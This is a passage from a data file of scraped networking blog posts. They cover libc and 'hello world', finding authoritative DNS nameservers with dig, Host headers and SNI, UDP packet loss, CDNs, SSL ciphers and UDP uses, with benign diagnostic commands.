that’s libc. \n\n why does libc matter? \n\n You might be wondering – why does it matter that Python calls the libc  write \nand then libc calls the  write  system call? Why am I making a point of saying\nthat  libc  is in the middle? \n\n I think in this case it doesn’t really matter (AFAIK the  write  libc function\nmaps pretty directly to the  write  system call) \n\n But there are different libc implementations, and sometimes they behave\ndifferently. The two main ones are glibc (GNU libc) and musl libc. \n\n For example, until recently  musl’s  getaddrinfo  didn’t support TCP DNS ,  here’s a blog post talking about a bug that that caused . \n\n a little detour into stdout and terminals \n\n In this program, stdout (the  1  file descriptor) is a terminal. And you can do\nfunny things with terminals! Here’s one: \n\n \n In a terminal, run  ls -l /proc/self/fd/1 . I get  /dev/pts/2 \n In another terminal window, write  echo hello > /dev/pts/2 \n Go back to the original terminal window. You should see  hello  printed there! \n \n\n that’s all for now! \n\n Hopefully you have a better idea of how  hello world  gets printed! I’m going to stop\nadding more details for now because this is already pretty long, but obviously there’s\nmore to say and I might add more if folks chip in with extra details. I’d\nespecially love suggestions for other tools you could use to inspect parts of\nthe process that I haven’t explained here. \n\n Thanks to everyone who suggested corrections / additions – I’ve edited this blog post a lot to incorporate more things :) \n\n Some things I’d like to add if I can figure out how to spy on them: \n\n \n the kernel loader and ASLR (I haven’t figured out yet how to use bpftrace + kprobes to trace the kernel loader’s actions) \n TTYs (I haven’t figured out how to trace the way  write(1, \"hello world\", 11)  gets sent to the TTY that I’m looking at) \n \n\n I’d love to see a Mac version of this \n\n One of my frustrations with Mac OS is that I don’t know how to introspect my\nsystem on this level – when I print  hello world , I can’t figure out how to\nspy on what’s going on behind the scenes the way I can on Linux. I’d love to\nsee a really in depth explainer. \n\n Some Mac equivalents I know about: \n\n \n ldd  ->  otool -L \n readelf  ->  otool \n supposedly you can use  dtruss  or  dtrace  on mac instead of strace but I’ve never been brave enough to turn off system integrity protection to get it to work \n strace  ->  sc_usage  seems to be able to collect stats about syscall usage, and  fs_usage  about file usage \n \n\n more reading \n\n Some more links: \n\n \n A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux \n an exploration of “hello world” on FreeBSD \n hello world under the microscope  for Windows \n From LWN:  how programs get run  ( and part two ) have a bunch more details on the internals of  execve \n Putting the “You” in CPU  by Lexi Mattick \n “Hello, world” from scratch on a 6502 (video from Ben Eater) \n \n\n"},
{"url": "https://jvns.ca/blog/2022/01/11/how-to-find-a-domain-s-authoritative-nameserver/", "title": "How to find a domain's authoritative nameservers", "content": "\n     \n\n Here’s a very quick “how to” post on how to find your domain’s authoritative\nnameserver. \n\n I’m writing this because if you made a DNS update and it didn’t work, there are 2 options: \n\n \n Your authoritative nameserver doesn’t have the correct record \n Your authoritative nameserver  does  have the correct record, but an old record is cached and you need to wait for the cache to expire \n \n\n To be able to tell which one is happening (do you need to make a change, or do\nyou just need to wait?), you need to be able to find your domain’s\nauthoritative nameserver and query it to see what records it has. \n\n But when I looked up “how to find a domain’s authoritative nameserver” to see\nwhat advice was out there, I found a lot of different methods being mentioned,\nsome of which can give you the wrong answer. \n\n So let’s walk through a way to find your domain’s authoritative nameservers\nthat’s guaranteed to always give you the correct answer. I’ll also explain why\nsome of the other methods aren’t always accurate. \n\n first, an easy but less accurate way \n\n If you definitely haven’t updated your authoritative DNS server in the last\nweek or so, a very easy way to find it is to run  dig +short ns DOMAIN \n\n $ dig +short ns jvns.ca\nart.ns.cloudflare.com.\nroxy.ns.cloudflare.com.\n \n\n In this case, we get the correct answer. Great! \n\n But if you  have  updated your authoritative DNS server in the last few days\n(maybe because you just registered the domain!), that can give you an\ninaccurate answer. So here’s the slightly more complicated way that’s\nguaranteed to always give you the correct answer. \n\n step 1: query a root nameserver \n\n We’re going to look up the authoritative nameserver for  jvns.ca  in this example. \n\n No matter what domain we’re looking up, we need to start with the root\nnameservers.  h.root-servers.net  is one of the  13 DNS root nameservers , and  dig @h.root-servers.net  means “send the query to  h.root-servers.net ”. \n\n $ dig @h.root-servers.net jvns.ca\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42165\n;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 4, ADDITIONAL: 9\n;; WARNING: recursion requested but not available\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;jvns.ca.\t\t\tIN\tA\n\n;; AUTHORITY SECTION: <------------ this is the section we're interested in\nca.\t\t\t172800\tIN\tNS\tc.ca-servers.ca. <------- we'll use this record\nca.\t\t\t172800\tIN\tNS\tj.ca-servers.ca.\nca.\t\t\t172800\tIN\tNS\tx.ca-servers.ca.\nca.\t\t\t172800\tIN\tNS\tany.ca-servers.ca.\n\n;; ADDITIONAL SECTION:\nc.ca-servers.ca.\t172800\tIN\tA\t185.159.196.2\nj.ca-servers.ca.\t172800\tIN\tA\t198.182.167.1\nx.ca-servers.ca.\t172800\tIN\tA\t199.253.250.68\nany.ca-servers.ca.\t172800\tIN\tA\t199.4.144.2\nc.ca-servers.ca.\t172800\tIN\tAAAA\t2620:10a:8053::2\nj.ca-servers.ca.\t172800\tIN\tAAAA\t2001:500:83::1\nx.ca-servers.ca.\t172800\tIN\tAAAA\t2620:10a:80ba::68\nany.ca-servers.ca.\t172800\tIN\tAAAA\t2001:500:a7::2\n\n;; Query time: 96 msec\n;; SERVER: 198.97.190.53#53(198.97.190.53)\n;; WHEN: Tue Jan 11 08:30:57 EST 2022\n;; MSG SIZE  rcvd: 289\n \n\n The answer we’re looking for is this line in the “AUTHORITY SECTION”: \n\n ca.\t\t\t172800\tIN\tNS\tc.ca-servers.ca.\n \n\n It doesn’t matter which line in this section you pick, you can use any of them. I just picked the first one. \n\n This tells us the server we need to talk to in step 2:  c.ca-servers.ca. \n\n step 2: query the .ca nameservers \n\n Now we run  dig @c.ca-servers.ca jvns.ca \n\n $ dig @c.ca-servers.ca jvns.ca\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24920\n;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 2, ADDITIONAL: 1\n;; WARNING: recursion requested but not available\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;jvns.ca.\t\t\tIN\tA\n\n;; AUTHORITY SECTION: <------------ this is the section we're interested in\njvns.ca.\t\t86400\tIN\tNS\tart.ns.cloudflare.com. <---- we'll use this record\njvns.ca.\t\t86400\tIN\tNS\troxy.ns.cloudflare.com.\n\n;; Query time: 26 msec\n;; SERVER: 185.159.196.2#53(185.159.196.2)\n;; WHEN: Tue Jan 11 08:32:44 EST 2022\n;; MSG SIZE  rcvd: 90\n \n\n Same as last time: the answer we’re looking for is this line in the “AUTHORITY\nSECTION”: \n\n jvns.ca.\t\t86400\tIN\tNS\tart.ns.cloudflare.com.\n \n\n Again, it doesn’t matter which line in this section you pick, you can use any\nof them. I just picked the first one. \n\n success! we know the authoritative nameserver! \n\n The authoritative nameserver for  jvns.ca  is  art.ns.cloudflare.com. . Now you\ncan now query  art.ns.cloudflare.com.  directly to see what DNS records it has\nfor  jvns.ca . \n\n $ dig @art.ns.cloudflare.com. jvns.ca\njvns.ca.\t\t292\tIN\tA\t172.64.80.1\n \n\n Nice, it worked. \n\n this is exactly what’s happening behind the scenes when you make a DNS query \n\n The reason I like this method is that it mimics what’s happening behind the\nscenes when you make a DNS query. When Google’s DNS resolver  8.8.8.8.  looks\nup  jvns.ca , the server it queries to to get  jvns.ca ’s authoritative nameserver is\n c.ca-servers.net  (or one of the other options, like  j.ca-servers.ca.  or  x.ca-servers.ca. ) \n\n Because this method uses the exact same information source as a real DNS query,\nyou’re guaranteed to get a correct answer every time. \n\n Often in practice I skip step 1 because I remember that the answer for  .ca \ndomains is  c.ca-servers.net , so I can skip straight to step 2. \n\n this is useful to do when you’re updating your nameservers \n\n When I update my nameservers with my domain registrar, they don’t actually update the\nauthoritative nameserver right away. It takes a while, maybe an hour. So I like\nto go through these steps to check if my registrar has actually updated my\nauthoritative nameserver yet. \n\n other ways to get a domain’s authoritative nameserver \n\n Here are a few other ways you can get the authoritative nameserver for a domain\nand why I didn’t recommend them as the main method. \n\n dig +trace jvns.ca \n\n This does the exact same thing so it will always give you the right answer, but\nthe output is a bit confusing to read so I’m a bit more hesitant to recommend\nit. \n\n dig ns jvns.ca \n\n This will usually give you the right answer, but there are 2 reasons it might\nbe wrong: \n\n \n You might get an old cached record \n The NS record you get doesn’t come from the same place as it does when we do\nthe method described in this post. In this example, instead of getting a NS\nrecord from  c.ca-servers.net ,  dig ns jvns.ca  will give you an NS record\nfrom  art.ns.cloudflare.com .  In practice usually these are the exact same\nthing, but in some weird edge cases they might not be. \n \n\n dig soa jvns.ca \n\n You can also find nameservers in the SOA record! \n\n $ dig SOA jvns.ca\njvns.ca.   3600    IN    SOA    art.ns.cloudflare.com. dns.cloudflare.com. 2267173366 10000 2400 604800 3600\n                                ^^^^^^^^^^^^^^^^^^^^^\n                                    here it is\n \n\n This will usually give the right answer, there are 2 reasons it might be wrong, similarly to the NS record: \n\n \n This response comes from your authoritative nameserver. So if you’re in the\nmiddle of updating your nameserver, you might get the wrong answer because\nyour DNS resolver sent the request to the old nameserver. \n Your authoritative nameserver could be returning a SOA record which doesn’t\nhave the correct nameserver for some reason \n \n\n whois jvns.ca \n\n This will usually give you the right answer, but it might be an old cached version. \n\n Here’s what this looks like on my machine for this example: (it gives us the right answer) \n\n $ whois jvns.ca | grep 'Name Server'\nName Server: art.ns.cloudflare.com\nName Server: roxy.ns.cloudflare.com\n \n\n that’s all! \n\n I hope this helps some of you debug your DNS issues! \n\n"},
{"url": "https://jvns.ca/blog/2016/07/14/whats-sni/", "title": "How do HTTP requests get sent to the right place?", "content": "\n     \n\n 10 years ago I configured the Apache webserver for the first time. I remember having to set up a “virtual host” to have more than one site running on the same machine, and I remember that I totally got it to work, but did not understand  at all  what was happening. \n\n Fast forward 8 years. One day I was reading  High Performance Browser Networking , which is an great book and you should read it. (in particular, there’s a really clear and fascinating explanation of WebRTC). \n\n And then I was talking to someone about it and they were like “hmm, so how do apache virtual hosts work?” and I was like “hmmmmmm.” AND SUDDENLY I KNEW AND IT WAS OBVIOUS. \n\n how to make a HTTP request from scratch \n\n The difference between 17-year old Julia and 25-year-old Julia is that 25-year-old Julia knew how HTTP works. \n\n When I’m experimenting with HTTP, sometimes I like to make HTTP requests manually (without using any tools like curl). It turns out this is easy! \n\n First, run  curl -v http://ask.metafilter.com > /dev/null  This will tell you at the beginning what request it sent. Then you put that into a file (the blank lines at the end are important): \n\n $ cat request.txt\nGET / HTTP/1.1\nHost: ask.metafilter.com\nUser-Agent: curl/7.47.0\n\n\n \n\n Then you use netcat to send the request to ask.metafilter.com! \n\n cat request.txt | netcat ask.metafilter.com 80\n# This also works: this is the IP for ask.metafilter.com\ncat request.txt | netcat 54.186.13.33 80\n \n\n If you remove the Host: part from this request, it does not work. Zero. Apache is all “400 Bad request”. 400 means it is your fault. \n\n the Host header \n\n So! Suppose you’re a web server, and you have some configuration like \n\n server {\n    name 'julia.com';\n    ... awesome perl site configuration ...\n}\n\nserver {\n    name 'bork.com';\n    ... awesome python site configuration ...\n}\n \n\n Then an HTTP request comes into the box! Perhaps like this \n\n curl -v http://julia.com\n> GET / HTTP/1.1\n> Host: julia.com\n> User-Agent: curl/7.47.0\n> Accept: */*\n \n\n So there’s this string in the request – “Host: julia.com”. This is what the web server uses to decide whether your request is for julia.com or bork.com or what. That’s it! \n\n I like this because once you know what a HTTP request looks like – it becomes kind of obvious how a web server would decide where to send the request. There are only 4 things in it and only one of them is julia.com! \n\n next level: SNI \n\n Once last year someone told me they were working on setting up SNI at work. I was like – what’s that? I had literally no idea what those letters meant. \n\n We used to live in a world where SSL was uncommon and difficult and a huge production and expensive. But now we have  let’s encrypt  and we want it to be easy and cheap and on by default. I’m going to use SSL and TLS interchangeably through this discussion. \n\n We still want to put many secure websites on the same server. How do we do it? At first this seems easy – just use the Host header again, right? But! \n\n \n The contents of an HTTP request for julia.com (including the host header) are  encrypted . \n With a certificate. \n Which certificate? The certificate for julia.com! \n How did I know to pick the certificate for julia.com? \n \n\n So the problem is that you need to choose which certificate you’re going to use  before  you see the Host header. There are basically 2 ways to deal with this: \n\n \n Just put every site on your server on the same certificate (make a certificate for all of julia.com bork.com cookies.com awesome.com pandas.com) \n Use SNI. (“Server Name Indication”) \n \n\n SNI is a standard where, when getting a website, you say “hey I’m gonna want julia.com” and the server is like “ok encryption time! I will use the cert for julia.com!” and then you say, secretly: “Host: julia.com. here’s more about that.” \n\n More technically speaking the very first packet in a TLS negotiation is called the “Client Hello” packet. This packet has a hostname like julia.com in it! So you can get the hostname out of that packet and then continue the negotiation with the right certificate. \n\n Paul Tagliamonte, who is great, wrote  a parser  that will let you extract the SNI hostname from a TLS packet! This is neat because you can see that it is only 150 lines of code or so. \n\n a story about nginx & SNI \n\n nginx is another web server! Let’s imagine you configure it this way. This is an experiment my awesome coworker Ray ran when we were trying to understand how nginx works. \n\n # this is not exactly how nginx is configured but it's close\nserver {\n    listen 443 ssl;\n    server_name 'julia.com';\n    ssl_certificate julia.com;\n    return 200 \"I'm julia.com\";\n}\n\nserver {\n    listen 443 ssl;\n    name 'bork.com';\n    ssl_certificate bork.com;\n    return 200 \"I'm bork.com\";\n}\n \n\n So, what happens if you set an SNI of julia.com, but then a Host header of bork.com? You can do this with  curl https://julia.com -H \"Host: bork.com\" \n\n Then you will get \n\n \n an SSL certificate for julia.com \n and it will say “I’m bork.com” \n \n\n Really. Now this makes some sense – if I open up a TCP connection to the server, I might make a lot of different HTTP requests inside for different websites (like julia.com, bork.com, cookies.com), and it needs to deal with that somehow! It can’t change SSL certificates in the middle. \n\n You might wonder “wait, is that secure to send requests for bork.com to julia.com?”. It’s okay! If you have a secure connection set up with a computer (you believe that computer is who you think it is), then it seems reasonable to send many requests to that computer (for instance for both images.google.com and google.com). \n\n But it’s a little weird, right? I wanted to make extra sure that I understood how this worked, so I went and read some of the nginx source code. It turns out that there is a big file called  ngx_http_request.c , and in it there is a function called  ngx_http_find_virtual_server ,  defined here . \n\n In that file, you’ll see that  ngx_http_find_virtual_server  is called  twice  per TLS request. Once to find the server block matching the SNI host (julia.com), to pick the right certificate. Then it’s called a second time when you get a Host header, to pick which server block to actually serve the response from.. \n\n So that’s how we get a response saying bork.com but a certificate for julia.com! \n\n <3 fundamentals \n\n Learning how HTTP works was an a+ move. It would be totally impossible for me to configure webservers at work if I didn’t know how it worked! \n\n"},
{"url": "https://jvns.ca/blog/2016/08/24/find-out-where-youre-dropping-packets/", "title": "Why do UDP packets get dropped?", "content": "\n     \n\n There’s a joke about UDP. it goes like this: “Never mind, you probably\nwouldn’t get it.” \n\n The first time I heard this joke I did not understand it because I didn’t\nreally understand what UDP was. UDP is a network protocol. The deal is: I send\nyou a network packet. Maybe you get it, maybe you don’t. I have no idea\nwhether it arrived or not. UDP doesn’t care. \n\n When you’re losing UDP packets, it’s sort of tempting to say “well, whatever,\nthat’s what happens when you use UDP!” But UDP packets don’t get lost by\nmagic. \n\n I was pretty confused about some the details of dropping UDP packets (how do\nyou know how many packets got dropped? what causes a packet to be dropped\n exactly ?) Maggie Zhou (who is the best) explained some new things to me\ntoday! All the parts of this that are right are thanks to her and all the\nparts that are wrong are thanks to me. \n\n This is all on Linux, as usual. There are going to be sysctls! It will be the\nbest. \n\n lost on the way out \n\n Imagine you’re sending a lot of UDP packets. Really a lot. On every UDP\nsocket, there’s a  “socket send buffer”  that you put packets into. The Linux\nkernel deals with those packets and sends them out as quickly as possible. So\nif you have a network card that’s too slow or something, it’s possible that it\nwill not be able to send the packets as fast as you put them in! So you will\ndrop packets. \n\n I have no idea how common this is. \n\n lost in transit \n\n It’s possible that you send a UDP packet in the internet, and it gets lost\nalong the way for some reason. I am not an expert on what happens on the seas\nof the internet, and I am not going to go into this. \n\n lost on the way in \n\n Okay, so a UDP packet comes into your computer. You have an application that\nis listening and waiting for a packet. Awesome! This packet goes into – maybe\nyou guessed it – a  socket receive buffer . How big is that buffer? Everything you might want to know about socket send and receive buffer sizes is helpfully explained in  the man page for  socket . Here’s the maximum receive buffer size on my computer: \n\n # This prints the max OS socket receive buffer size for all types of connections.\n$ sudo sysctl net.core.rmem_max\nnet.core.rmem_max = 212992\n$ sudo sysctl net.ipv4.udp_mem \nnet.ipv4.udp_mem = 181110\t241480\t362220\n \n\n man udp  says that that last number from  net.ipv4.udp_mem  (362220) means\n“Number of pages allowed for queueing by all UDP sockets.” 362220 pages is\n1.7GB? That’s a lot of pages! Weird. Not sure what’s up with that. \n\n Then your application reads packets out of that buffer and handles them. If\nthe buffer gets full, the packets get dropped. Simple! \n\n You can see how many packets have been dropped on your machine with  netstat\n-suna . Mine has dropped 918 packets so far apparently (“918 packet receive\nerrors”) \n\n $ netstat -suna\nIcmpMsg:\n    InType3: 1072\n    OutType3: 522\nUdp:\n    1828608 packets received\n    568 packets to unknown port received.\n    918 packet receive errors\n    662721 packets sent\n    RcvbufErrors: 918\n    SndbufErrors: 1031\n    IgnoredMulti: 659\n \n\n This is cool! This means that if you have a machine which is trying to drop as\nfew UDP packets as possible (for instance if you’re running statsd), then you\ncan monitor the rate at which that machine is dropping packets! \n\n buffers everywhere \n\n After I published this blog post initially, @gphat and @nelhage very astutely\npointed out that the OS socket send/receive buffers are not the only buffers. \n\n EVERYTHING IS BUFFERS. Your network card has a buffer that can get full! There\nare a bunch of intermediate routers between your computer and my computer. All\nof those have buffers! Those buffers can get full! My current understanding is\nthat most packet loss is because of full buffers one way or another. \n\n If you’re interested in learning more details about the Linux networking stack, there is this huge post called  Monitoring and Tuning the Linux Networking Stack: Receiving Data . I have not read it yet but it looks  amazing . \n\n Also everything here I said about UDP packets applies just as well to any kind\nof IP packet – TCP packets can get dropped just as easily, but they’ll get\nretried, so you’re not as likely to notice. \n\n"},
{"url": "https://jvns.ca/blog/2016/04/29/cdns-arent-just-for-caching/", "title": "CDNs aren't just for caching", "content": "\n     \n\n I joined the infrastructure team at work this week! So I’ve been learning a bunch of new things. Today I learned a ton about what CDNs are for. \n\n A CDN is a “content delivery network” – the idea is that you’re a website and you have some Fancy Javascript File that you want people everywhere in the world to download. No problem. That is what the internet is for. \n\n But you are in New York, and the speed of light is slow (really!), and you are trying to send the javascript file to Sydney – that’s 16,000 km away, which is 50ms at the speed of light, or a 100ms round trip. With a bad mobile connection that’s dropping packets, it can get even worse! So now everyone can probably still get your file, mostly, but it might take them a long time to get it. \n\n A common solution is to put the file on a server physically in Sydney, so that Sydneysiders (!!) can get it faster. This is what a CDN does. And I thought that was all that it did! But today I asked  many questions on Twitter  and it turns out that I was very wrong – CDNs are not only good for caching content! People also use them for other reasons! So in this post we’re only going to discuss non-caching uses of CDNs. \n\n The core questions we’re going to try to answer are: \n\n \n does putting your site (without caching) behind a CDN get you better performance? \n how about better reliability? \n are there other advantages? \n \n\n Spoiler: the answers to all these questions seem to be yes, sometimes. \n\n make your site faster: speed up the dreaded TLS handshake \n\n This was the first (and most compelling) reason that people repeatedly brought up. \n\n Suppose that you’re serving content securely, as we like to do these days. If you Google “TLS handshake”, you’ll see a diagram like  this one . The important thing about this diagram is that it has 7 packets. If a cell phone in Sydney needs to set up a TLS connection with your website in New York that will take at  least  350ms (because of the speed of light), and more if any packets get dropped. This is not good! \n\n But how will a proxy server in Sydney fix this?! WELL. Suppose you give the server in Sydney your SSL certificate. Then it can set up a TLS connection with the flaky cell phone and, separately, use a TLS connection it already has set up to send you the data and get the cell phone the response. Lots of people told me that they do this and that it can be way faster. Cool. \n\n You are perceptive and will notice that you have to give the CDN your SSL certificate to do this. More about that later. \n\n make your site faster: smart routing \n\n Forgetting about TLS for a moment now: how else could having a server in Sydney help the flaky cell phone get its data faster? Well, this is the normal way you’ll get the data from the phone to your server \n\n phone -> public internet -> your server\n \n\n If you have a CDN which owns / has “peering agreements” on a lot of cool network infrastructure, then you could potentially have \n\n phone -> public internet -> Sydney computer -> magic CDN internet -> your server\n \n\n no public internet for you! You can buy MAGICAL FANCY INTERNET for your users to get to your server on. \n\n Basically CDNs have a bunch of routing tricks that they can use to make your packets go faster. One cool article about this (thanks to  Nelson Minar ) is  Fixing the internet for real time applications  – it’s not about CDNs but it is about a games company building a bunch of network infrastructure. Super well written. It talks a little about BGP which is a super interesting topic that I do not yet know a lot about. \n\n Fancy routing tricks to get you your data faster is what Cloudflare is talking about with things like  Railgun . \n\n keep your site up: DDOS mitigation \n\n I originally phrased my question as “can a CDN help with site reliability?” If it can protect you from a DDOS attack, then, yes it can!!! This also has nothing to do with caching – if the CDN can manage to pass through all the normal requests you want to see but block all the ATTACK SCARY BAD REQUESTS, then that’s awesome and will help keep your site up. \n\n performance is reliability \n\n I asked “can CDNs help with reliability or just performance?” and a few people very rightly pointed out that you can’t really completely separate those two things. As an extreme example, if your site takes 3 minutes to respond, you cannot truly fairly say that it is “up”. And a lot of timeouts kick in after just a few seconds! \n\n better security? \n\n A few people mentioned that using a CDN can improve your security. Specifically – suppose a new SSL vulnerability comes out. Maybe the CDN has a super kickass security team and they’ll patch the vulnerability really quickly, and also make sure that they don’t accept SSL versions that are insecure. \n\n This one seems a little more tenuous to me – like, I also work for a company with a really good security team. It feels kind of scary to me to not have control over when you can patch your server (apparently maybe  some Amazon ELBs took a long time to get patched for Heartbleed?  See also  this HN thread ). \n\n The other thing about security here is – governments make companies hand over information, and if you give the CDN your SSL certificate and put sensitive traffic through it, then you don’t know who they are giving your users’ data to. I used to think this was weird paranoia but I’m pretty sure by now we all know it’s a real thing to worry about. \n\n Cloudflare apparently has a thing called  Keyless SSL  which “allows sites to use CloudFlare without requiring them to give up custody of their private keys”. Honestly I did not understand that blog post yet but it seems interesting and highly relevant so I am linking to it anyway. \n\n I know approximately nothing about security so I’m going to stop talking about security now. \n\n so do you get better reliability? (some downsides) \n\n I was asking all these questions because I was trying to figure out if putting your website behind a CDN will make it more or less reliable. Nothing with computers is all butterflies & flowers and now we get to talk about a couple more disadvantages of putting your site behind a CDN:  configuration problems  and  the CDN going down . \n\n First, configuration problems. I only know like 3 things about CDNs as of this week but I do know that they’re pretty tricky to configure. You need to set all these cache-control headers and make all these settings and connect them to your servers right and it’s easy to accidentally screw something up and bring down your site. \n\n Second, if your site is up 99.9% of the time and the CDN is up 99.9% of the time, suddenly now your site + the CDN is only up 99.8% of the time. I can’t really find good stats on SLAs for fastly/cloudfront/cloudflare/akamai/whatever so it’s not clear to me how often CDNs usually have reliability problems. However, the more I learn about computers the more I learn to be skeptical of services other people are selling you. If you know where to find stats about this I would be super interested. \n\n this stuff is hard \n\n It is apparently a pretty normal thing to put a site behind a CDN without caching it! Who knew? Not me, before today. There’s a good  talk from Etsy from 2013  about using multiple CDNs which I’ve read the slides for and need to watch. \n\n I realized that I linked to Cloudflare a lot in this blog post. I think this is because they have a great technical blog that explains a lot of interesting stuff (like  the curious case of slow downloads ) so it’s easier to understand what’s going on with their products. I have never used Cloudflare for anything serious so I can’t speak to how well it actually works (though I do use it for this blog). \n\n As usual I learned most of this stuff literally today so probably at least 5 things are wrong. Especially the security stuff. \n\n I’m really impressed by companies with great technical blogs. And kind of jealous of the people who work for those companies. People from Cloudflare say the company lets people write on their blog about what they find interesting! This seems like an awesome strategy. \n\n"},
{"url": "https://jvns.ca/blog/2016/05/06/what-are-ssl-ciphers-and-session-keys/", "title": "What are SSL ciphers & session keys?", "content": "\n      This morning I gave a lightning talk at work (about what I learned about CDNs last week). Lightning talks at work are super fun and great. I like hearing about what my coworkers are working on & thinking about a lot, and they’re pretty lightweight to prepare. \n\n During that talk, I made some offhand remark like “I know basically nothing\nabout security”, which is true. Then at lunch  Cory \nwas like “hey, you said you knew nothing about security! I have some facts for\nyou!” and proceeded to tell me a very useful thing I did not know!! \n\n So. I knew about public key cryptography, and that people use\n RSA  to do encryption. I\nmostly know how RSA works because I took a number theory class in undergrad and\nthought I understood what RSA was for – you encrypt messages with it, right? \n\n It turns out that no, you do not use RSA to encrypt messages in practice, which is what Cory told me and what surprised me so much. \n\n The Wikipedia article says: \n\n \n RSA is a relatively slow algorithm, and because of this it is less commonly\nused to directly encrypt user data. More often, RSA passes encrypted shared\nkeys for symmetric key cryptography which in turn can perform bulk encryption-\ndecryption operations at much higher speed. \n \n\n So. If you’re developing the SSL protocol, you want encryption to be pretty fast. RSA is super secure but not very fast. So what do you do? Maybe what that Wikipedia paragraph says! \n\n \n choose a fast symmetric cipher (like AES). This is called, well, the  cipher . \n choose a random key for that cipher. This is called the  session key . \n Encrypt that key using RSA (public key crypto) and send it to the person you’re communicating with \n Then you both have the same AES key, and can encrypt all your communications back and forth after that \n \n\n I then went and read Karla Burnett’s great article  SSL: It’s hard to do right , which says \n\n \n For example, if a client negotiated the Diffie-Hellman protocol (DH) for key exchange, with RSA for authentication,  AES_256_CBC  as a cipher, and SHA-256 as a hash, the connection would have a ciphersuite of  DH_RSA_WITH_AES_256_CBC_SHA256 . \n \n\n which suggests that you don’t actually encrypt keys with RSA, but instead you agree on a key using Diffie-Hellman. But in any case you  definitely  don’t encrypt your messages with RSA. \n\n Now all the conversations people have about insecure SSL/TLS ciphers make so much more sense to me!! Like, if your server chooses a bad cipher to communicate with, it doesn’t matter that the way you decided on that key is really good and totally secure! They can just break the cipher and read your SSL traffic. \n\n If you’re interested in SSL you should read Karla’s article! It’s super good and explains a lot of recent SSL exploits quite clearly, and really motivates me to keep my TLS up to date :). \n\n"},
{"url": "https://jvns.ca/blog/2016/12/21/what-s-interesting-about-udp/", "title": "What's interesting about UDP?", "content": "\n     \n\n I asked on Twitter today “what’s interesting about UDP”? ( this tweet )\nI got a bajillion replies. Here’s a rough summary because there was\nsome really interesting stuff in there once I made it through all the\nUDP jokes and I don’t want to lose it. \n\n First, we should talk about what UDP is for a second: UDP lets you send\nnetwork packets. If a UDP packet you send gets dropped, you never find\nout about it and nobody will help you retry. Retrying is up to you. \n\n Technically speaking it stands for “user datagram protocol” but I think\n“unreliable data protocol” is better because it’s funny and probably\nmore accurate anyway. \n\n Another fact about UDP is that if you mention UDP there will be 1000\njokes about dropping packets. \n\n So! What is there to know about UDP? Here’s a list. \n\n One interesting thing was that there’s a really common notion “video\nstreaming/VOIP uses UDP” and “games use UDP” but I think the issues\nthere are actually kind of subtle and sometimes these things actually\nend up using TCP instead. I don’t understand this very well yet but it\ndoesn’t seem to be totally straightforward. \n\n DNS uses UDP \n\n This is possibly the most important protocol that works on top of UDP. I\nthink the  reason  DNS uses UDP is probably that practically all DNS requests and\nresponses fit into a single IP packet, so retry logic is relatively simple\n(you send your request, if you don’t get a response, you just.. try\nagain.) You don’t need to assemble multiple packets. \n\n When servers need to send a large DNS response, they use TCP instead (I\nactually ran into a bug at work recently related to this – in one case\nUDP DNS responses were working properly, and TCP responses weren’t). \n\n statsd uses UDP \n\n statsd   is a metrics server from Etsy.\nThe idea here is that statsd uses UDP because metrics reporting should\nbe as cheap as possible (sending UDP packets is really fast, there is no\nconnection to manage). Some extra factors. \n\n \n the overhead of setting up a TCP connection is pretty high, so they\ndon’t want to do that for every single statistics request \n Etsy uses PHP, which I think means they can’t have long-lived\npersistent TCP connections \n \n\n Also apparently sometimes people do logging (like syslog) over UDP.\nHere’s  an RFC about that . It’s\nnot clear to me that this is generally a good idea (it leads with\n“Network administrators and architects should be aware of the\nsignificant reliability and security issues of this transport”) \n\n Packet size limits \n\n The practical packet size limits for UDP are pretty important to\nunderstand. \n\n This seems super important – with TCP you can kind of ignore the fact\nthat internet packets can only be so big, because TCP will automatically\ncombine packets for you. With UDP, it gets important\nreally fast because there’s no automatic combining of packets. You need\nto manually split up your data into packets. \n\n For example the reason there are only 13 root DNS servers\nis that DNS uses UDP and that is how many fit inside a single UDP packet! (according to\n wikipedia ) \n\n WebRTC uses UDP \n\n The chapter in “High Performance Browser Networking”  about WebRTC  is\nsuper interesting and well written and very much worth a read. Also that whole book is\ngreat. Actually you should probably just go read that chapter instead of this\nblog post :). \n\n Some games use UDP \n\n Your Game Doesn’t Need UDP (Yet)  is an article about this. Many real-time games use UDP because dropped frames are considered better than delayed frames. I know almost nothing about this. \n\n @caitie summarized the reason some games use UDP pretty clearly: \n\n \n UDP is used for video and some games because with TCP you can get huge\ndelays for one dropped packet. Imagine you are sending 20 packets via\nTCP, and packet 3 goes missing. Due to network delay you don’t get the\nmissing packet 3 msg until you’ve sent all 20 messages so now you have\nto send 3 through 20 again to guarantee in order delivery. So on very\nlossy networks you can waste a lot of bandwidth and cycles resending\npackets. \n \n\n video streaming uses UDP, sometimes \n\n \n “Most h.264 streams for live cameras and such are UDP as far as I know.” ( here ) \n “I worked on the video delivery side more recently, and RTMP, RTSP,\nand obviously HLS etc. are all TCP now” ( here ) \n \n\n probably don’t reimplement TCP on top of UDP \n\n If you actually want reliable message delivery, you should probably just\nuse TCP and not try to do any fancy UDP tricks. If you really actually\ndo not care if your packets arrive or not and they are all basically\nindependent of each other and the order does not matter at all (like\nwith statsd), maybe that is a good time to use UDP. \n\n It’s possible that, most of the time, the answer to “when should I use\nUDP” is “don’t, just use TCP instead, it’ll be easier”. \n\n Google is maybe trying to reimplement TCP with UDP though \n\n See  QUIC ,  SPDY \n\n multicast \n\n Wikipedia says “The most common transport layer protocol to use\nmulticast addressing is User Datagram Protocol (UDP).” I still don’t\nunderstand what’s up with multicast but many people mentioned it. Here’s\n the wikipedia article . \n\n “udp lets you write stateless protocols. stateless protocols are great\ncause you can talk to millions of peers from 1 machine” \n\n other interesting stuff \n\n \n udp checksum is endian independent! \n “how Bittorrent built uTP on top of it is interesting” \n I’ve been confused before that you can still get a “connection\nrefused” (via icmp) even though UDP is connectionless (this is a\nreal, weird, thing) \n UDP is used in a 